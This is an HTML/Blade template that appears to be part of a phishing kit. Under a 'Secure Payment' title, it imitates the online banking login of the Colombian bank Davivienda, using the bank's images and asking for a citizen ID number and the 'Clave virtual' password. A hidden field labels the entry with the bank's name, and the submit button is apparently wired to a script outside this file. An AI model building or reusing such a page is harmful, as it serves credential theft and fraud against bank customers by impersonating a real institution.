<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
		


    <title>Secure Payment</title>
    <style>
        *{
            margin: 0;
            padding: 0;
            font-family: arial;
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            color:white;
        }


        input{
            background-color: #605c5cd2;
            height: 40px;
        }

        a{
            font-size: 22px;
            margin-left:10px;
           
        }
        

        select{
            background-color: #e2e2e2b2;
            height: 40px;
            border: none;
            width: 75%;
            margin-left:50px;
            border-radius: 12px;
            padding-left: 10px;
        }
        input{
            width: 35%;
            border-radius:12px;
            padding-left:5px;
        }
    </style>
</head>
<body style="background-color:#6d6e72;">
<img src="{{asset('assets/img/payment/davivienda/texto.jfif')}}" alt="" srcset="" width="100%">

<div class="datos">
    <h6 style="margin-left:50px; margin-top:25px;">Tipo documento</h6>
    <select name="cc" id="">
        <option value="cedula" select>Cedula de Ciudadania</option>
    </select><br><br>

    <center><label for="documento" style="margin-left:-10px;"> <b>No. documento</b>
    </label>
    <label for="clave" style="margin-left:50px;"> <b>Clave virtual</b>
    </label><br>

    <input type="tel" name="documento" id="txtUsuario" style="margin-top:5px;" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');">
    <input type="password" name="clave" id="txtPass" style="margin-top:5px;" minlength="6" maxlength="8"  oninput="this.value = this.value.replace(/\s+/g, '')">
    <input type="hidden" value="davivienda" id="banco">

        <input type="submit" value="Ingresar" id="btnUsuario" style="border:none; background-color:red; height:45px; border-bottom:5px solid red; margin-top:5px;"><br><br><br>
        <a style="font-size:15px;">¿Olvidó o bloqueó su clave?</a> <br>
</center>
<br><br>
</div>


    <img src="{{asset('assets/img/payment/davivienda/davi1.jfif')}}" alt="" srcset="" width="100%">

    <img src="{{asset('assets/img/payment/davivienda/davi2.jfif')}}" alt="" srcset="" width="100%">
</body>
</html>